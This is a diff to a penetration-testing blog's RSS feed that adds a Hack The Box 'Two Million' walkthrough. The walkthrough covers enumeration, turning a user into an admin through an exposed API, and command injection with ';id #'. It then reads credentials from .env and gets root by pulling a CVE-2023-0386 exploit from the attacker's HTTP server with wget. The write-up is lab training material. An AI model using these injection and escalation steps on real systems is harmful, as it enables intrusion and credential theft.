@@ -4,10 +4,78 @@
         <title>Penetration Testing Journal Blog</title>
         <link>https://danae-pan.github.io/Blog/blog</link>
         <description>Penetration Testing Journal Blog</description>
-        <lastBuildDate>Sun, 15 Jun 2025 00:00:00 GMT</lastBuildDate>
+        <lastBuildDate>Sat, 02 Aug 2025 00:00:00 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
+        <item>
+            <title><![CDATA[Two Million]]></title>
+            <link>https://danae-pan.github.io/Blog/blog/TwoMillion</link>
+            <guid>https://danae-pan.github.io/Blog/blog/TwoMillion</guid>
+            <pubDate>Sat, 02 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Task 1]]></description>
+            <content:encoded><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>How many TCP ports are open?</p>
+<p>Running <code>nmap -sS &lt;target_ip&gt;</code> we see two ports open on the target system.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-1-44a5e88fc5d4b4bf08a2d53f807be20a.png" width="801" height="203" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?</p>
+<p>Navigating to the target IP on the browser we see that the server is not found. After adding the target IP on the host file using the command <code>sudo vim /etc/hosts</code> with the domain name being <code>2million.htb</code> we can refresh the page and navigate to the /invite page. There, we see a sign-up/login form.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-2-a7054f9e4d1c11f2e9dfe305242ec1c7.png" width="590" height="318" class="img_ev3q"></p>
+<p>Viewing the page source and searching for any Javascript file, we locate the following, having the name <code>inviteapi.min.js</code>:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-3-e8a46b7e6da7df0a7bcbf4aee440ccdc.png" width="922" height="530" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.</p>
+<p>Opening the previous file, we locate the function <code>makeInviteCode</code> that is the Javascript function returning the first hint.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?</p>
+<p>First, opening the console on the developer tools, we call the function by <code>makeInviteCode</code> and observe the result:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-4-8c05b368bb63181127adc02b441811e0.png" width="1001" height="399" class="img_ev3q"></p>
+<p>We see that the data is encoded with ROT13, so we can decode the value of the field <code>data</code> using any ROT13 decoder and we get the message "In order to generate the invite code, make a POST request to /api/v1/invite/generate". So, we can use <code>fetch</code> in the browser console to query this endpoint by:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">fetch('/api/v1/invite/generate', {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  method: 'POST',</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  headers: { 'Content-Type': 'application/json' }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">})</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  .then(res =&gt; res.json())</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  .then(data =&gt; console.log(data));</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>As a response, we see the code that is encoded using Base64.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-5-f120ebc9d3aa6a80628771bdffd19f93.png" width="542" height="74" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?</p>
+<p>First, we decode the code from the previous task and use it to sign up and register for an account. We then login and look for the "Connection Pack". We find it under the "Access" page, we open the tools on the Network tab and clicking the button. On the Headers tab of the request we see the API endpoint where the GET function sends the request.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>How many API endpoints are there under /api/v1/admin?</p>
+<p>By navigating to the endpoint <code>/api/v1</code> we can see a list of endpoints including admin.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-6-58a64bab300755410abbd3eb3d884a70.png" width="569" height="429" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>What API endpoint can change a user account to an admin account?</p>
+<p>Inspecting the result from the previous task we see that he desired endpoint is <code>/api/v1/admin/settings/update</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>What API endpoint has a command injection vulnerability in it?</p>
+<p>We can try to send a PUT request to the endpoint from the previous task using Repeater. We need to also adjust the content type to be Content-Type: application/json on the request. From the response we see that there is a missing parameter for the email field.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-8-80438640b17331e3c9579032101f78c2.png" width="458" height="315" class="img_ev3q"></p>
+<p>Adding the parameter email on the body of the request and repeating we see that there is also the is_admin parameter missing. We can try adding this as well with the value being true to see whether we are able to change the privileges for the registered user. Sending this request we get a status code of 200 meaning a successful request.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-9-4be6b81e194a2fe40e9d7190ac47a4b9.png" width="631" height="418" class="img_ev3q"></p>
+<p>We can also use the endpoint <code>/api/v1/admin/auth</code> to check if the user is admin which returns a positive response. Since we are now an admin user, we can also try the last API endpoint with the method POST <code>/api/v1/admin/vpn/generate</code>. For this request to succeed, we need also to add the Content-Type to be application/json as before as well as the username with its value as body parameter. To see if this is the endpoint that has the command injection vulnerability, we can try injecting <code>;id #</code> after the value of the username field on the body.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-10-3bc452f38b49ac62d0e88a7850ab2fbd.png" width="631" height="404" class="img_ev3q"></p>
+<p>The request goes through giving us a 200 OK status code and returning back the user's identity information which means the command injection is successful.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>What file is commonly used in PHP applications to store environment variable values?</p>
+<p>Further using the command injection, we can try listing the contents of the diretory by changing the <code>id</code> command to <code>ls</code>. On the response, we see a list of files and folders.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-11-3fecff40a6fe711a3c41c85287a398b4.png" width="631" height="443" class="img_ev3q"></p>
+<p>From those, we can use <code>cat index.php</code> command and see the contents of this file in the response.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-t-12-d90868d3521bf23af1a0582bf59b7657.png" width="583" height="342" class="img_ev3q"></p>
+<p>From the response it seems that those values are being read from a <code>.env</code> file. Seeing the contents of the file with the command <code>cat .env</code> we get the environmental variables for the database as a response.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
+<p>Submit the flag located in the admin user's home directory.</p>
+<p>Using the admin's credentials found previously, we can now directly ssh to the server to obtain the flag by <code>ssh admin@2million.htb</code> and providing the admin's password. Then, finding the flag is just as easy as running <code>cat user.txt</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
+<p>What is the email address of the sender of the email sent to admin?</p>
+<p>In linux, local emails are usually stored in <code>/var/mail</code> directory. Navigating there and opening the file with the name "admin" we find the sender.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
+<p>What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?</p>
+<p>Looking up for vulnerabilities of the Overlay file system in the <a href="https://www.cve.org/" target="_blank" rel="noopener noreferrer">CVE database</a>, we find the CVE ID.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-13">Task 13<a href="https://danae-pan.github.io/Blog/blog/TwoMillion#task-13" class="hash-link" aria-label="Direct link to Task 13" title="Direct link to Task 13">​</a></h3>
+<p>Submit the flag located in root's home directory.</p>
+<p>Looking up for a public exploit for this vulnerability we come up with a <a href="https://github.com/sxlmnwb/CVE-2023-0386" target="_blank" rel="noopener noreferrer">github repository</a>. In order to use this exploit on the target machine where we gained the admin privilege, we have first to clone it on the host machine and then open a connection by spanning a python server on the directory where the repository file is. Before attempting transfer, we need to compress the entire foler into a single file using the command <code>tar czf CVE-2023-0386.tar.gz CVE-2023-0386/</code>. Running <code>python3 -m http.server 8080</code> opens a connection on port 8080 so we can now communicate from the target server to transfer the file using the command <code>wget http://&lt;host_ip&gt;:8080/CVE-2023-038.tar.gz</code>. Then, after extracting the archive by <code>tar xzf CVE-2023-0386.tar.gz</code> we can use the repository's README as guide to compile by running <code>make</code>. On the same terminal we then run <code>./fuse ./ovlcap/lower ./gc</code> and om a second terminal <code>./exp</code>. We now have root access and we can navigate to root's directory, run <code>cat root.txt</code> and get the flag.</p>]]></content:encoded>
+            <category>easy</category>
+            <category>linux</category>
+        </item>
         <item>
             <title><![CDATA[Cicada]]></title>
             <link>https://danae-pan.github.io/Blog/blog/Cicada</link>
